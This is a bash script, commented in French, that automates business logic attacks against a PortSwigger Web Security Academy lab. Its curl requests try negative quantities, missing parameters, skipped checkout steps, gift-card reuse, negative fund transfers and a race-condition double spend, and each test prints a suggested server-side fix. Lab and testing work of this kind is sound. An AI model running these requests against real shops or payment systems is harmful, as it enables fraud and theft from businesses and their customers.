#!/bin/bash

# PortSwigger Business Logic Flaws - Automated Bash Script with Functions and Suggestions
# Usage: Edit the variables below with your session cookies, credentials, and target URLs.

# --------- Configuration (edit these values) ---------
BASE_URL="https://<your-lab>.web-security-academy.net"
COOKIE="session=<your_session_cookie>"
PRODUCT_ID="1"
PURCHASE_PATH="/cart"
TRANSFER_PATH="/transfer"
APPLY_COUPON_PATH="/apply-coupon"
GIFT_CARD_CODE="GC-12345"
TARGET_USER="carlos"
# -----------------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Test de manipulation de quantité (ex: quantité négative, excessive)
test_quantity_manipulation() {
    print_sep
    echo "[1] Test de manipulation de quantité (négative, excessive, zéro)"
    for qty in -10 0 9999; do
        resp=$(curl -sk -b "$COOKIE" -d "productId=$PRODUCT_ID&quantity=$qty" "$BASE_URL$PURCHASE_PATH")
        echo "Tentative d'achat avec quantité=$qty :"
        echo "$resp"
        if [[ "$resp" == *"credit"* || "$resp" == *"balance"* || "$resp" == *"success"* ]]; then
            echo ">> [ALERTE] Achat possible avec une quantité anormale ($qty) !"
            echo ">> PROPOSITION : Valider côté serveur que la quantité est strictement positive et raisonnable."
        fi
    done
}

# 2. Test de suppression ou absence de paramètres obligatoires
test_missing_parameters() {
    print_sep
    echo "[2] Test de suppression de paramètres obligatoires"
    resp=$(curl -sk -b "$COOKIE" -d "quantity=1" "$BASE_URL$PURCHASE_PATH")
    echo "Requête sans productId : $resp"
    resp2=$(curl -sk -b "$COOKIE" -d "productId=$PRODUCT_ID" "$BASE_URL$PURCHASE_PATH")
    echo "Requête sans quantity : $resp2"
    if [[ "$resp" == *"success"* || "$resp2" == *"success"* ]]; then
        echo ">> [ALERTE] L'opération aboutit malgré l'absence d'un paramètre obligatoire !"
        echo ">> PROPOSITION : Vérifier côté serveur la présence de tous les paramètres requis."
    fi
}

# 3. Test de séquence d'étapes inattendue (workflow abuse)
test_workflow_abuse() {
    print_sep
    echo "[3] Test de séquence d'étapes inattendue (workflow abuse)"
    echo "Soumission d'une étape finale sans avoir complété les étapes préalables..."
    resp=$(curl -sk -b "$COOKIE" "$BASE_URL/checkout/complete")
    echo "Réponse : $resp"
    if [[ "$resp" == *"success"* || "$resp" == *"order confirmed"* ]]; then
        echo ">> [ALERTE] Il est possible de finaliser un achat sans suivre le workflow prévu !"
        echo ">> PROPOSITION : Implémenter un suivi d'état de session côté serveur pour chaque étape critique."
    fi
}

# 4. Test d'utilisation multiple d'un même coupon ou code cadeau
test_coupon_reuse() {
    print_sep
    echo "[4] Test d'utilisation multiple d'un même coupon/carte cadeau"
    for i in 1 2; do
        resp=$(curl -sk -b "$COOKIE" -d "code=$GIFT_CARD_CODE" "$BASE_URL$APPLY_COUPON_PATH")
        echo "Tentative d'utilisation #$i du code $GIFT_CARD_CODE : $resp"
    done
    if [[ "$resp" == *"success"* ]]; then
        echo ">> [ALERTE] Le code cadeau/coupon peut être utilisé plusieurs fois !"
        echo ">> PROPOSITION : Invalider le code côté serveur après la première utilisation."
    fi
}

# 5. Test de transfert de fonds avec montant négatif ou excessif
test_negative_transfer() {
    print_sep
    echo "[5] Test de transfert de fonds avec montant négatif ou excessif"
    for amount in -1000 0 999999; do
        resp=$(curl -sk -b "$COOKIE" -d "recipient=$TARGET_USER&amount=$amount" "$BASE_URL$TRANSFER_PATH")
        echo "Transfert de $amount à $TARGET_USER : $resp"
        if [[ "$resp" == *"success"* || "$resp" == *"transferred"* ]]; then
            echo ">> [ALERTE] Transfert possible avec un montant anormal ($amount) !"
            echo ">> PROPOSITION : Valider côté serveur que le montant est strictement positif et inférieur au solde."
        fi
    done
}

# 6. Test d'accès concurrent (race condition)
test_race_condition() {
    print_sep
    echo "[6] Test d'accès concurrent (race condition, double-spend)"
    echo "Lancez deux requêtes simultanées pour utiliser le même code cadeau (nécessite deux terminaux ou & en arrière-plan) :"
    echo "curl -sk -b \"$COOKIE\" -d \"code=$GIFT_CARD_CODE\" \"$BASE_URL$APPLY_COUPON_PATH\" &"
    echo "curl -sk -b \"$COOKIE\" -d \"code=$GIFT_CARD_CODE\" \"$BASE_URL$APPLY_COUPON_PATH\" &"
    echo ">> Analysez si le code est accepté deux fois (double dépense)."
}

# Main script execution
echo "=== PortSwigger Business Logic Flaws Automated Checks ==="
test_quantity_manipulation
test_missing_parameters
test_workflow_abuse
test_coupon_reuse
test_negative_transfer
test_race_condition

print_sep
echo "[SYNTHÈSE]"
echo "Comparez les réponses ci-dessus pour identifier d'éventuelles failles de logique métier."
echo "Pour chaque alerte, appliquez les propositions correctives recommandées."
echo "Documentation PortSwigger : https://portswigger.net/web-security/logic-flaws"
print_sep

# End of script
